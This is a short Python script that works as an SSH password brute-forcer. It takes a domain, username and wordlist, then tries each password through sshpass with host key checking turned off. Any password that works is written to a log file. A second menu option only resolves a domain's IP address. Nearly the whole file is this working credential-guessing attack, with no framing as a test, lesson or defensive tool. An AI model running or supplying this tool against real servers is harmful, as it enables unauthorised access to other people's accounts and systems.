import socket
import subprocess
import os
import sys
import time

def get_ip_address(domain):
    try:
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.gaierror:
        return None

def prompt_for_input():
    domain = input("Please enter a domain: ")
    username = input("Enter Username: ")
    wordlist_path = input("Enter Wordlist file path: ")
    return domain, username, wordlist_path

def brute_force(ip_address, username, wordlist_path):
    if not os.path.isfile(wordlist_path):
        print("Error: Wordlist file not found!")
        sys.exit(1)
    elif not os.access(wordlist_path, os.R_OK):
        print("Error: Wordlist file is not readable!")
        sys.exit(1)

    if subprocess.call(["which", "sshpass"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
        print("Error: sshpass is not installed. Please install it and try again.")
        sys.exit(1)

    logfile = "bruteforce_success.log"
    with open(wordlist_path, 'r') as wordlist:
        for password in wordlist:
            password = password.strip()
            print(f"Trying password: {password}")
            result = subprocess.call(["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5", f"{username}@{ip_address}", "exit"])
            if result == 0:
                print(f"Password found: {password}")
                with open(logfile, 'a') as log:
                    log.write(f"[{subprocess.getoutput('date')}] Password found for {username}@{ip_address}: {password}\n")
                sys.exit(0)
            elif result == 5:
                print("Connection refused or timeout")
                sys.exit(1)
            time.sleep(1)
    
    print("Password not found.")
    sys.exit(1)

def main():
    print("Choose an option:")
    print("1. Brute Force")
    print("2. Web")

    choice = input("Enter your choice (1 or 2): ")

    if choice == '1':
        if len(sys.argv) != 4:
            print("Domain, username, and wordlist file path are required.")
            domain, username, wordlist_path = prompt_for_input()
        else:
            domain, username, wordlist_path = sys.argv[1:4]

        ip_address = get_ip_address(domain)
        if not ip_address:
            print(f"{domain}: Unable to find IP address")
            sys.exit(1)

        brute_force(ip_address, username, wordlist_path)

    elif choice == '2':
        domain = input("Please enter a domain: ")
        ip_address = get_ip_address(domain)
        if ip_address:
            print(f"{domain}: {ip_address}")
        else:
            print(f"{domain}: Unable to find IP address")
    else:
        print("Invalid choice. Please enter 1 or 2.")
        sys.exit(1)

if __name__ == '__main__':
    main()
